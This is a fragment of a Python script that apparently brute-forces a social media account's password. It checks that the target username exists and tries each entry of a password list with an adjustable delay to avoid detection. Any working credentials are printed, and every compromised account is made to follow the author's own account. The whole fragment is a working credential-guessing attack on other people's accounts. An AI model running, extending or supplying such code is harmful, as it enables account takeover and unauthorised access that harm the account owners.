


username = str(input('Please enter a username: '))
username = userExists(username)
if (username == False):
	exit()
else:
	username = username['username']



delayLoop = int(input('Please add delay between the passwords (in seconds): ')) 


for i in range(len(passwords)):
	password = passwords[i]
	sess = Login(username,password)
	if (sess):
		print ('Login success %s' % [username,password])

		#because i am cool
		follow(sess,'avr_amit')

	try:
		time.sleep(delayLoop)
	except KeyboardInterrupt:
		an = str(input('Type y/n to exit: '))
		if (an == 'y'):
			exit()
		else:
			continue
